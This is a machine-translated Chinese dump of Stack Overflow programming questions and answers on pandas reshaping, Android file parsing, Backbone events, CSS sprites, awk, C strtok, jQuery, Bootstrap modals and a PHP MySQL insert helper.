    *   分别使用 Apache 2.0 和 3-clause BSD 风格的许可证，合法地结合`bayesian`代码和[`libpgm`](http://pythonhosted.org/libpgm/)代码来尝试进行推理和学习是可行的。
*   缺点：
    *   中没有任何学习`bayesian`。尝试将`libpgm`学习与`bayesian`课堂和推理结合起来将是一项挑战。
    *   甚至`bayesian`假设节点是由固定 python 函数的因子给出的。参数学习需要一些包装代码来调整概率。
    *   `bayesian`是用纯 python 编写的，使用 dicts 等作为基本结构，不使用任何 speedup`numpy`或`pandas`类似的包可能带来的，因此即使对于我构建的小例子也很慢。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2014-02-10T01:45:53.267

我知道今天有点晚了，但是您可能会对Octave forge [NaN 包感兴趣。](http://octave.sourceforge.net/nan/index.html)这个包中的分类器之一是增强朴素贝叶斯分类器。该代码是 GPL 的，因此您可以轻松地将其移植到 Python。

# winapi - 如何启用弹出菜单与 WM_MENUCOMMAND 而不是 WM_COMMAND 进行通信？

> ID：14916356
> 
> 赞同：0
> 
> 时间：2013-02-16T23:36:50.300
> 
> 标签：winapi, menu

我读到的是菜单必须将其 MenuInfo.dwStyle 标志设置为 MNS_NOTIFYBYPOS，我所做的是：

```
MENUINFO MenuInfo;
memset(&MenuInfo,0, sizeof(MenuInfo));
MenuInfo.cbSize = sizeof(MenuInfo);
HMENU hPopupMenu = CreatePopupMenu();
GetMenuInfo(hPopupMenu, &MenuInfo);
MenuInfo.dwStyle |= MNS_NOTIFYBYPOS;
SetMenuInfo(hPopupMenu, &MenuInfo); 
```

接下来继续添加项目：

```
InsertMenu(hPopupMenu, pos, MF_BYPOSITION, id , "do command"); 
```

接下来跟踪它：

```
TrackPopupMenu(hPopupMenu, TPM_CENTERALIGN | TPM_RETURNCMD, cursorPos.x, cursorPos.y, 0, hwnd, NULL); 
```

但它没有效果，它编译没有错误，但点击事件直到发送为`WM_COMMAND`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T01:24:10.637

您需要设置`MENUINFO`结构的 fMask 成员来告诉系统您要设置/获取哪些字段。

例如

```
MenuInfo.fMask = MIM_STYLE;
GetMenuInfo(hPopupMenu, &MenuInfo);
MenuInfo.dwStyle |= MNS_NOTIFYBYPOS;
SetMenuInfo(hPopupMenu, &MenuInfo); 
```

另请注意，文档说：

> MNS_NOTIFYBYPOS 是菜单标题样式，应用于单个子菜单时无效。

因此，弹出菜单可能对您不起作用。

# ios - 目标 c 可可代表，概念性

> ID：14916357
> 
> 赞同：0
> 
> 时间：2013-02-16T23:36:53.300
> 
> 标签：ios, objective-c, delegates

我将有几个需要委托的 uiimageview 交互式 sulasses。当它们中的每一个都被触摸时，视图控制器必须通过更改某些内容来做出响应。

拥有一种方法是一种很好的常见做法，即所有 uiimageview 子类实例都调用委托方法吗？

委托将是视图控制器。

总的来说，这是一个好的做法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-16T23:46:42.237

一种方法更好。这将是一个不错的选择`- (void)imageViewTouched:(UIImageView *)sender`

您应该遵循 DRY（不要重复自己）原则并消除应用程序中的代码重复。因此，如果它们具有单独的逻辑，则应该具有单独的方法。如果为不同的发件人执行相同类型的逻辑，您应该有一种方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-16T23:39:55.557

绝对地。传入发件人，以便您可以根据谁向您发送消息（如`tableView:cellForRowAtIndexPath:`）做出决定，并且您可以很好地实现委托模式。

# python - 根据列标签重塑熊猫中的数据框

> ID：14916358
> 
> 赞同：12
> 
> 时间：2013-02-16T23:37:04.970
> 
> 标签：python, numpy, pandas, scipy, multi-index

在熊猫中重塑以下数据框的最佳方法是什么？此 DataFrame`df`具有`x,y`每个样本的值（`s1`在`s2`本例中），如下所示：

```
In [23]: df = pandas.DataFrame({"s1_x": scipy.randn(10), "s1_y": scipy.randn(10), "s2_x": scipy.randn(10), "s2_y": scipy.randn(10)})
In [24]: df
Out[24]: 
       s1_x      s1_y      s2_x      s2_y
0  0.913462  0.525590 -0.377640  0.700720
1  0.723288 -0.691715  0.127153  0.180836
2  0.181631 -1.090529 -1.392552  1.530669
3  0.997414 -1.486094  1.207012  0.376120
4 -0.319841  0.195289 -1.034683  0.286073
5  1.085154 -0.619635  0.396867  0.623482
6  1.867816 -0.928101 -0.491929 -0.955295
7  0.920658 -1.132057  1.701582 -0.110299
8 -0.241853 -0.129702 -0.809852  0.014802
9 -0.019523 -0.578930  0.803688 -0.881875 
```

`s1_x`并且`s1_y`是样本 1 的 x/y 值，`s2_x, s2_y`是样本 2 的样本值，等等。如何将其重塑为仅包含`x`,`y`列但包含一个附加列的 DataFrame，该列`sample`表示 DataFrame 中的每一行是否来自`s1`还是`s2`？例如

```
 x         y      sample
0  0.913462  0.525590          s1
1  0.723288 -0.691715          s1
2  0.181631 -1.090529          s1
3  0.997414 -1.486094          s1
...
5  0.396867  0.623482          s2
... 
```

这对于稍后使用 Rpy2 绘制东西很有用，因为许多 R 绘图功能可以利用这个分组变量，所以这就是我重塑数据框的动机。

我认为 Chang She 给出的答案并不能转化为具有唯一索引的数据框，例如：

```
In [636]: df = pandas.DataFrame({"s1_x": scipy.randn(10), "s1_y": scipy.randn(10), "s2_x": scipy.randn(10), "s2_y": scipy.randn(10), "names": range(10)})
In [637]: df
Out[637]: 
   names      s1_x      s1_y      s2_x      s2_y
0      0  0.672298  0.415366  1.034770  0.556209
1      1  0.067087 -0.851028  0.053608 -0.276461
2      2 -0.674174 -0.099015  0.864148 -0.067240
3      3  0.542996 -0.813018  2.283530  2.793727
4      4  0.216633 -0.091870 -0.746411 -0.421852
5      5  0.141301 -1.537721 -0.371601 -1.594634
6      6  1.267148 -0.833120  0.369516 -0.671627
7      7 -0.231163 -0.557398  1.123155  0.865140
8      8  1.790570 -0.428563  0.668987  0.632409
9      9 -0.820315 -0.894855  0.673247 -1.195831
In [638]: df.columns = pandas.MultiIndex.from_tuples([tuple(c.split('_')) for c in df.columns])

In [639]: df.stack(0).reset_index(1)
Out[639]: 
  level_1         x         y
0      s1  0.672298  0.415366
0      s2  1.034770  0.556209
1      s1  0.067087 -0.851028
1      s2  0.053608 -0.276461
2      s1 -0.674174 -0.099015
2      s2  0.864148 -0.067240
3      s1  0.542996 -0.813018
3      s2  2.283530  2.793727
4      s1  0.216633 -0.091870
4      s2 -0.746411 -0.421852
5      s1  0.141301 -1.537721
5      s2 -0.371601 -1.594634
6      s1  1.267148 -0.833120
6      s2  0.369516 -0.671627
7      s1 -0.231163 -0.557398
7      s2  1.123155  0.865140
8      s1  1.790570 -0.428563
8      s2  0.668987  0.632409
9      s1 -0.820315 -0.894855
9      s2  0.673247 -1.195831 
```

转换有效，但在此过程中列`"names"`丢失了。如何将`"names"`列保留在 df 中，同时仍对其名称中的列进行熔化转换`_`？该`"names"`列只是为数据框中的每一行分配一个唯一的名称。例如，这里是数字，但在我的数据中它们是字符串标识符。

谢谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-02-17T03:05:57.237

我假设你已经有了 DataFrame。在这种情况下，您可以将列转换为 MultiIndex 并使用堆栈，然后使用 reset_index。请注意，然后您必须重命名和重新排序列并按示例排序以*准确*获取您在问题中发布的内容：

```
In [4]: df = pandas.DataFrame({"s1_x": scipy.randn(10), "s1_y": scipy.randn(10), "s2_x": scipy.randn(10), "s2_y": scipy.randn(10)})

In [5]: df.columns = pandas.MultiIndex.from_tuples([tuple(c.split('_')) for c in df.columns])

In [6]: df.stack(0).reset_index(1)
Out[6]: 
  level_1         x         y
0      s1  0.897994 -0.278357
0      s2 -0.008126 -1.701865
1      s1 -1.354633 -0.890960
1      s2 -0.773428  0.003501
2      s1 -1.499422 -1.518993
2      s2  0.240226  1.773427
3      s1 -1.090921  0.847064
3      s2 -1.061303  1.557871
4      s1 -1.697340 -0.160952
4      s2 -0.930642  0.182060
5      s1 -0.356076 -0.661811
5      s2  0.539875 -1.033523
6      s1 -0.687861 -1.450762
6      s2  0.700193  0.658959
7      s1 -0.130422 -0.826465
7      s2 -0.423473 -1.281856
8      s1  0.306983  0.433856
8      s2  0.097279 -0.256159
9      s1  0.498057  0.147243
9      s2  1.312578  0.111837 
```

如果您可以使用 MultiIndex 创建 DataFrame，则可以保存 MultiIndex 转换。

编辑：使用合并重新加入原始ID

```
In [59]: df
Out[59]: 
   names      s1_x      s1_y      s2_x      s2_y
0      0  0.732099  0.018387  0.299856  0.737142
1      1  0.914755 -0.798159 -0.732868 -1.279311
2      2 -1.063558  0.161779 -0.115751 -0.251157
3      3 -1.185501  0.095147 -1.343139 -0.003084
4      4  0.622400 -0.299726  0.198710 -0.383060
5      5  0.179318  0.066029 -0.635507  1.366786
6      6 -0.820099  0.066067  1.113402  0.002872
7      7  0.711627 -0.182925  1.391194 -2.788434
8      8 -1.124092  1.303375  0.202691 -0.225993
9      9 -0.179026  0.847466 -1.480708 -0.497067

In [60]: id = df.ix[:, ['names']]

In [61]: df.columns = pandas.MultiIndex.from_tuples([tuple(c.split('_')) for c in df.columns])

In [62]: pandas.merge(df.stack(0).reset_index(1), id, left_index=True, right_index=True)
Out[62]: 
  level_1         x         y  names
0      s1  0.732099  0.018387      0
0      s2  0.299856  0.737142      0
1      s1  0.914755 -0.798159      1
1      s2 -0.732868 -1.279311      1
2      s1 -1.063558  0.161779      2
2      s2 -0.115751 -0.251157      2
3      s1 -1.185501  0.095147      3
3      s2 -1.343139 -0.003084      3
4      s1  0.622400 -0.299726      4
4      s2  0.198710 -0.383060      4
5      s1  0.179318  0.066029      5
5      s2 -0.635507  1.366786      5
6      s1 -0.820099  0.066067      6
6      s2  1.113402  0.002872      6
7      s1  0.711627 -0.182925      7
7      s2  1.391194 -2.788434      7
8      s1 -1.124092  1.303375      8
8      s2  0.202691 -0.225993      8
9      s1 -0.179026  0.847466      9
9      s2 -1.480708 -0.497067      9 
```

或者：

```
 In [64]: df
Out[64]: 
   names      s1_x      s1_y      s2_x      s2_y
0      0  0.744742 -1.123403  0.212736  0.005440
1      1  0.465075 -0.673491  1.467156 -0.176298
2      2 -1.111566  0.168043 -0.102142 -1.072461
3      3  1.226537 -1.147357 -1.583762 -1.236582
4      4  1.137675  0.224422  0.738988  1.528416
5      5 -0.237014 -1.110303 -0.770221  1.389714
6      6 -0.659213  2.305374 -0.326253  1.416778
7      7  1.524214 -0.395451 -1.884197  0.524606
8      8  0.375112 -0.622555  0.295336  0.927208
9      9  1.168386 -0.291899 -1.462098  0.250889

In [65]: df = df.set_index('names')

In [66]: df.columns = pandas.MultiIndex.from_tuples([tuple(c.split('_')) for c in df.columns])

In [67]: df.stack(0).reset_index(1)
Out[67]: 
      level_1         x         y
names                            
0          s1  0.744742 -1.123403
0          s2  0.212736  0.005440
1          s1  0.465075 -0.673491
1          s2  1.467156 -0.176298
2          s1 -1.111566  0.168043
2          s2 -0.102142 -1.072461
3          s1  1.226537 -1.147357
3          s2 -1.583762 -1.236582
4          s1  1.137675  0.224422
4          s2  0.738988  1.528416
5          s1 -0.237014 -1.110303
5          s2 -0.770221  1.389714
6          s1 -0.659213  2.305374
6          s2 -0.326253  1.416778
7          s1  1.524214 -0.395451
7          s2 -1.884197  0.524606
8          s1  0.375112 -0.622555
8          s2  0.295336  0.927208
9          s1  1.168386 -0.291899
9          s2 -1.462098  0.250889 
```

# android - 在android中解析文本文件

> ID：14916364
> 
> 赞同：3
> 
> 时间：2013-02-16T23:37:55.020
> 
> 标签：android, parsing, text-files

在我的应用程序中，我创建了一个文本文件来保存读数，其值如下所示：

98、97、98、……

我需要从文本文件中获取读数并将它们保存在数组列表中。我试图实现它，但我得到了运行时异常。

## 代码：

```
package com.example.meme;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.widget.TextView;

public class test extends Activity{

    private static ArrayList<String> LIST=new ArrayList<String>();
    private static ArrayList<String> LIST2=new ArrayList<String>();
    TextView index;
    String[] inputArray;
    String delimiter = ", ";
    String input;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        index = (TextView) findViewById(R.id.textView1);
        setContentView(R.layout.activity_main);

//reading the values line by line and save them in the arraylist :"LIST"
            try {
            File sdcard = Environment.getExternalStorageDirectory();
            File file = new File(sdcard,"Oximeter.txt");

                BufferedReader br = new BufferedReader(new FileReader(file));  
                String line;   
                while ((line = br.readLine()) != null) {

                            LIST.add(line);

                            } }
            catch (IOException e) {
                e.printStackTrace();

            }

//parsing each line saved in the arraylist "LIST", and save the result in a new arraylist called LIST2
           for(int i=0; i<LIST.size(); i++)
            {
                input=LIST.get(i);// this will take the line
               inputArray = input.split(delimiter);//inputArray will include the readings
               for(int j=0;i<inputArray.length;j++)
               {
               LIST2.add(inputArray[j]);//readings are added to an arraylist
               }
            }
           index.setText("mamoun");
    }

} 
```

## 猫日志：

```
02-17 03:31:51.296: D/AndroidRuntime(5538): Shutting down VM
02-17 03:31:51.296: W/dalvikvm(5538): threadid=1: thread exiting with uncaught exception (group=0x40c501f8)
02-17 03:31:51.304: E/AndroidRuntime(5538): FATAL EXCEPTION: main
02-17 03:31:51.304: E/AndroidRuntime(5538): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.meme/com.example.meme.MainActivity}: java.lang.NullPointerException
02-17 03:31:51.304: E/AndroidRuntime(5538):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1970)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1995)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at android.app.ActivityThread.access$600(ActivityThread.java:127)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1161)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at android.os.Handler.dispatchMessage(Handler.java:99)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at android.os.Looper.loop(Looper.java:137)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at android.app.ActivityThread.main(ActivityThread.java:4512)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at java.lang.reflect.Method.invokeNative(Native Method)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at java.lang.reflect.Method.invoke(Method.java:511)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:984)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:751)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at dalvik.system.NativeStart.main(Native Method)
02-17 03:31:51.304: E/AndroidRuntime(5538): Caused by: java.lang.NullPointerException
02-17 03:31:51.304: E/AndroidRuntime(5538):     at com.example.meme.MainActivity.onCreate(MainActivity.java:73)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at android.app.Activity.performCreate(Activity.java:4465)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1052)
02-17 03:31:51.304: E/AndroidRuntime(5538):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1934)
02-17 03:31:51.304: E/AndroidRuntime(5538):     ... 11 more
02-17 03:33:00.507: I/Process(5673): Sending signal. PID: 5673 SIG: 9 
```

我试图搜索这些错误，但没有运气，请你帮我找出错误。

在此先感谢您的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-16T23:43:40.903

小猜测。在方法的开头尝试此代码`onCreate()`。

```
 super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    index = (TextView) findViewById(R.id.textView1); 
```

在设置 Activity 的布局之前，您当前正在尝试检索布局中的某些内容。

# backbone.js - 检查 Backbone 事件对象内 this.el 上的 css 类

> ID：14916365
> 
> 赞同：1
> 
> 时间：2013-02-16T23:38:00.610
> 
> 标签：backbone.js, backbone-events

```
events: {
    'click .pdf_preview' : 'onPreviewPdfClick',
    'click a.next' : '_nextPointer',
    'click a.prev' : '_prevPointer',
    'mouseleave .mediapop-item-container' : 'onMouseLeave',
    'mouseenter .mediapop-item-container' : 'onMouseEnter',
    // Editable events
    'click &.editable .dialog-header h3' : 'showEditTitleForm'  <--- this
}, 
```

我创建了一个具有编辑模式的弹出视图。虽然我可以简单地用一个可编辑的版本扩展这个视图，但我需要的是非常基本的，所以我设置了它，所以如果你传递元素`this.options.editable`，`view.el`它上面会有一个“可编辑”类。

我想知道是否有办法在事件对象中指定该选择器。这样如果`this.options.editable`is not就不会触发事件`true`。如果 Backbone 支持 SASS 样式选择器语法，那么上面的方法就可以了。唯一的选择是检查 this.$el.hasClass('ediable') 内`showEditTitleForm`。

我知道您是否设置了这样的选择器：

```
'click' : 'myAction', 
```

点击事件将应用于`this.el`容器。如果存在附加类，我希望仅应用回调。

是否可以在不在回调方法中添加检查的情况下执行与上述类似的操作？

编辑：错字

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T03:42:59.950

你总是可以在调用`events`之前进行修改[`delegateEvents`](http://backbonejs.org/#View-delegateEvents)，只是注意不要修改`events`附加到视图的原型。像这样的东西：

```
initialize: function() {
    if(this.options.editable) {
        this.events = _({}).extend(this.events, {
            'click .dialog-header h3': 'showEditTitleForm'
        });
    }
} 
```

请注意`_({}).extend(...)`, 将合并`this.events`（来自原型）和额外事件到一个空对象中，这样您就不会意外更改`events`原型中的 。

演示：http: [//jsfiddle.net/ambiguous/dNYXN/](http://jsfiddle.net/ambiguous/dNYXN/)

# css - 使 CSS Sprite 具有响应性

> ID：14916369
> 
> 赞同：0
> 
> 时间：2013-02-16T23:38:16.103
> 
> 标签：css, twitter-bootstrap, css-sprites, fluid-layout

更新 2：取得进一步进展。差不多好了！

jsFiddle：http: [//jsfiddle.net/persianturtle/Tfemm/6/](http://jsfiddle.net/persianturtle/Tfemm/6/)

精灵现在 99% 响应，除了

```
margin-bottom:  % 
```

当页面改变宽度时不能完美对齐。这

```
margin-left:    % 
```

似乎工作得很好。

关于如何完美对齐边距底部的任何想法？

更新：取得进展，但还没有。

下面是 jsFiddle：http: [//jsfiddle.net/persianturtle/Tfemm/5/](http://jsfiddle.net/persianturtle/Tfemm/5/)

我想要裁剪的精灵图像是响应式的，除了它只是水平裁剪而不是垂直裁剪。

下面的代码：

```
<div class="responsive-sprite" style="width: 100%;">  
<img alt="Yay for alt tags..." src="http://zx85.dyndns.org/raphtest/img/nav-buttons2.jpg" />  
</div> 

img {  
 width: 100%;  
 height: 200%;
 margin-left: -81.869%;  
}  
.responsive-sprite {  
 overflow: hidden; 
} 
```

任何人都可以想出一种垂直裁剪的方法吗？

## 以下是原帖：

有没有办法让 CSS 精灵响应？

看看随附的 jsFiddle：http: [//jsfiddle.net/persianturtle/Tfemm/2/](http://jsfiddle.net/persianturtle/Tfemm/2/)

一旦容器不再适合全尺寸图像，有没有办法调整这个 CSS 精灵的大小？

```
<div class="container">

    <h2 class="popular"><img src="http://zx85.dyndns.org/raphtest/img/nav-buttons2.jpg" alt="" />Featured</h2>

</div>

.container {
    width: 20%;
    margin: 0 auto;
}

h2 {
    overflow: hidden;
    position: relative;
    height: 128px;
    width: 192px;
    max-width: 100%;
}
h2 img {
  position: relative;
}
h2.popular img {
  top: 0;
  left: -867px;
}
h2.popular img:hover {
  top: -128px;
  left: -867px;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:51:14.633

嗯。棘手。

我还没有测试过，但是将精灵水平而不是垂直定向是否可以，然后：

```
h2 {
    overflow: hidden;
    position: relative;
    width: 192px;
    max-width: 100%;
}

h2 img {
    position: relative;
    width: 200%;
}

h2.popular img {
    top: 0;
    left: 0;
}

h2.popular:hover img {
    top: 0;
    left: -100%;
} 
```

## 编辑：

似乎工作，只需要配置精灵。看看这个[JSFiddle](http://jsfiddle.net/dsundy/Tfemm/3/)。

不幸的是，我认为您必须单独执行每个按钮，因为图像高度决定了调整大小时的按钮高度。

# linux - 使用 bash 脚本从字母数字文本文件中检索数字

> ID：14916372
> 
> 赞同：1
> 
> 时间：2013-02-16T23:38:34.243
> 
> 标签：linux, bash

我正在将定时可执行文件的结果输出到已运行 10 次的文件中。我有一个文件中的所有时间，我需要从这个文件中找到最佳、最差和平均用户时间。我正在考虑使用 awk 的组合来打印第一列，但我不确定如何从行中删除“用户”，以便我可以对它进行数字排序。

此外，我需要摆脱偶数行，因为它们具有有关输入和输出的信息以及与这些计算无关的事物。时间文件示例如下：

```
1.12user 0.00system 0:01.12elapsed 99%CPU (0avgtext+0avgdata 5408maxresident)k
0inputs+0outputs (0major+398minor)pagefaults 0swaps 
```

有谁知道我会怎么做？

任何帮助，将不胜感激！谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:52:54.107

你可以吗？

```
awk -F'user' 'NR%2{print $1}' file 
```

举个例子：

```
kent$  cat file
1.11user 0.00system 0:01.12elapsed 99%CPU (0avgtext+0avgdata 5408maxresident)k
0inputs+0outputs (0major+398minor)pagefaults 0swaps
1.10user 1.00system 0:01.12elapsed 99%CPU (0avgtext+0avgdata 5408maxresident)k
0inputs+0outputs (0major+398minor)pagefaults 0swaps
1.12user 2.00system 0:01.12elapsed 99%CPU (0avgtext+0avgdata 5408maxresident)k
0inputs+0outputs (0major+398minor)pagefaults 0swaps
1.13user 3.00system 0:01.12elapsed 99%CPU (0avgtext+0avgdata 5408maxresident)k
0inputs+0outputs (0major+398minor)pagefaults 0swaps

kent$  awk -F'user' 'NR%2{print $1}' file
1.11
1.10
1.12
1.13 
```

甚至这可能？

```
 awk -F'user' 'NR%2{a[++i]=$1;s+=$1}END{asort(a);print "best: "a[1];print "worst: "a[length(a)];print "avg: "s/length(a)}' file 
```

上面的例子将输出：

```
best: 1.10
worst: 1.13
avg: 1.115 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-16T23:54:16.403

如果您只对初始编号#user 感兴趣。

```
cat txt | paste - - | cut -d' ' -f1  | tr -d "[:alpha:]" | sort -n 
```

给出：

```
1.12
1.13
1.14
1.15
1.16 
```

在我的 txt 示例中，数字已更改以证明排序。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-16T23:46:02.897

```
tr -s ' '  '[:alpha:]' < inputfile | awk '{print $1, $2, $3} ' > newfile 
```

还有其他变体可以做同样的事情。

# c - 将空格分隔的字符串转换为 C 中的指针数组

> ID：14916376
> 
> 赞同：-1
> 
> 时间：2013-02-16T23:39:11.270
> 
> 标签：c

我有一个像这样的字符串：“arg1 arg2 arg3”，我想发送给 exec。但是 execvpe 将指针数组作为命令参数。有没有办法可以将 arg1、arg2 和 arg3 放入指针数组中？

我已经用 strtok 将它们分开了，但不知道下一步该做什么......我有 *argv[x] 等着它们。

谢谢你，J

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:46:31.177

`strtok`已经将指向每个项目的指针交给你，所以你需要做的就是获取返回的值`strtok`并将它们放在你的`argv`数组中。

```
char *str = "arg1 arg2 arg3";
char *argv[3];

int i = 0;
argv[i] = strtok(args, " ");
while (argv[i] != NULL) {
    i++;
    argv[i] = strtok(NULL, " ");
 } 
```

# javascript - javascript Remove value from array, 数组问题

> ID：14916378
> 
> 赞同：0
> 
> 时间：2013-02-16T23:39:35.637
> 
> 标签：javascript, jquery

我正在尝试用字符串填充数组，将添加的元素是单击 <\li> 的 HTML，我可能正确填充它。

我的问题是当用户再次单击选中的链接时，我想从数组中删除此项

这是一个代码示例：

```
$(document).ready(function(){
    var chosen = [];
    var chosenCounter = 0;

            find("ul").find("li").click(function(){
        var checkBox = $(this).find("img").first();
        var checkBoxSrc = checkBox.attr("src");
        if(checkBoxSrc == "images/unchecked.png"){
            checkBoxSrc = "images/checked.png";
            checkBox.attr("src",checkBoxSrc);
            checkBox = "";
            checkBoxSrc = "";
            var temp = this.outerHTML;
            chosen[chosenCounter] = temp;
            chosenCounter ++;
        }
        if(checkBoxSrc == "images/checked.png"){
            checkBoxSrc = "images/unchecked.png";
            checkBox.attr("src",checkBoxSrc);
            checkBox = "";
            checkBoxSrc = "";

    for (var j =0; j<=chosen.length; j++){
            var tempRemove = this.outerHTML;
            chosen.splice( chosen.indexOf( tempRemove ), 1 );
            tempRemove = '';
        }
    }
}); 
```

});

我一直在尝试我在互联网上找到的所有功能和方式..但结果效果不佳，我将非常感谢您的更正和解释。提前谢谢大家。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:54:54.250

我已经重写了代码以更好地工作。有很多问题，但这是我测试的固定版本。

*   您的原始代码有一个**if**语句，然后是另一个**if**语句。你需要一个 if 然后一个**else if**。
*   请注意，在查找子元素时，我只使用 $('img', this) 而不是 find 运算符和 first()。
*   使用 ID 而不是 HTML
*   对于调试，那里有一个 console.log 语句。删除它以便它在 IE 中工作。
*   要将元素添加到数组中，请使用**push**
*   无需循环拼接即可删除该项目。只需调用 splice 一次。

    $(文档).ready(函数 () {

    ```
    var chosenIDs = [];

    $("ul li").click(function () {
        var checkBox = $('img', this);
        var checkBoxSrc = checkBox.attr("src");
        var id = $(this).attr('data-id');
        console.log(id + ' ' + chosenIDs.length + ' ' + checkBoxSrc);

        if (checkBoxSrc == "images/unchecked.png") {
            checkBoxSrc = "images/checked.png";
            checkBox.attr("src", checkBoxSrc);

            chosenIDs.push(id);
        }
        else if (checkBoxSrc == "images/checked.png") {
            checkBoxSrc = "images/unchecked.png";
            checkBox.attr("src", checkBoxSrc);

            chosenIDs.splice(chosenIDs.indexOf(id), 1);
        }
    }); 
    ```

    });

# android - 到期计时器

> ID：14916384
> 
> 赞同：0
> 
> 时间：2013-02-16T23:39:56.073
> 
> 标签：android, android-asynctask, android-service

我的 Android 数据库中有一条记录，它与创建时间一起保存。我想要一个计时器，在 2 小时后该项目将被删除。我研究了一下，得出了两个结果：

一个是制作一个 AsyncTask，但在我看来，这个解决方案会占用太多资源而无需任何资源。

第二个是实施服务。我对 Android 中的服务及其工作原理一无所知。我做了一些阅读，但我不知道如何让服务计算时间并检查它是否已超过其使用寿命。

哈尔普请。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:08:20.523

我建议你可以看看`AlarmManager`类 [http://developer.android.com/reference/android/app/AlarmManager.html](http://developer.android.com/reference/android/app/AlarmManager.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:17:51.540

为什么不简单地忽略超过 2 小时的行？只需在您的表上创建一个视图。与删除旧记录的数据库上的 INSERT/UPDATE 触发器配对。

伪：用于视图选择

```
select * from table where createdate > now()-2hours

create trigger on table.cleanuptrigger after insert/update 

on table for each row when createdate < now()-2hours; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-19T22:15:50.410

我发现只要您的应用程序还活着，“CountDownTimer”就可以很好地工作。

# javascript - Twitter-Bootstrap 模式无法正常工作

> ID：14916390
> 
> 赞同：1
> 
> 时间：2013-02-16T23:40:44.627
> 
> 标签：javascript, jquery, twitter-bootstrap, modal-dialog

我创建了一个模态对话

```
<a href="#myModal" role="button" class="btn" data-toggle="modal" id="LaunchDemo">Launch demo modal</a>

<!-- Modal -->
<div id="myModal" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
        <h3 id="myModalLabel">Modal header</h3>
    </div>
    <div class="modal-body">
        <p>One fine body…&lt;/p>
    </div>
</div> 
```

我刚刚从..调用了模态

```
$("a#LaunchDemo").click(); 
```

但是模态只是`blinking`在屏幕上，我也通过按钮单击调用了模态。我遇到了同样的问题，我哪里出错了？，请帮助..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-16T23:46:36.790

您需要在 DOM 完全加载时执行您的 javascript 代码。并使用`modal`而不是`click`

```
$(document).ready(function() {
   $('#LaunchDemo').modal(options)
}); 
```

演示：http: [//jsfiddle.net/MgcDU/1998/](http://jsfiddle.net/MgcDU/1998/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-20T11:25:50.347

当模型的 with 太大时会出错。

您可以在引导文件 {width:900} 中设置模式类的样式表时尝试

它会发生....

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-15T05:46:55.060

`hide`尝试从模态 div 中删除该类：
`<div id="myModal" class="modal`~~`hide`~~`fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">`

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-02-16T23:45:12.657

删除超链接标记中的**href="#myModal"**，因为它试图将您链接到页面的一部分。

此外，您不需要在选择器中指定元素类型。仅按 ID 搜索元素会更快。

# php - phpmysql插入空白而不是值

> ID：14916395
> 
> 赞同：0
> 
> 时间：2013-02-16T23:41:09.640
> 
> 标签：php, mysql, insert

我有以下功能：

```
function insert($database, $table, $data_array)
{
# Connect to MySQL server and select database
$mysql_connect = connect_to_database();
mysql_select_db ($database, $mysql_connect);

# Create column and data values for SQL command
foreach ($data_array as $key => $value) 
    {
    $tmp_col[] = $key;
    $tmp_dat[] = "'$value'";
    }
 $columns = join(",", $tmp_col);
 $data = join(",", $tmp_dat);

# Create and execute SQL command
$sql = "INSERT INTO ".$table."(".$columns.")VALUES(". $data.");";
$result = mysql_query($sql, $mysql_connect);

# Report SQL error, if one occured, otherwise return result
if(mysql_error($mysql_connect))
    {
    echo "MySQL Update Error: ".mysql_error($mysql_connect);
    $result = "";
    }
else
    {
    return $result;
    }
} 
```

php中的值如下：

```
$content_table = "p_content";
$insert_array['title'] = $title;
    $insert_array['content'] = $content;
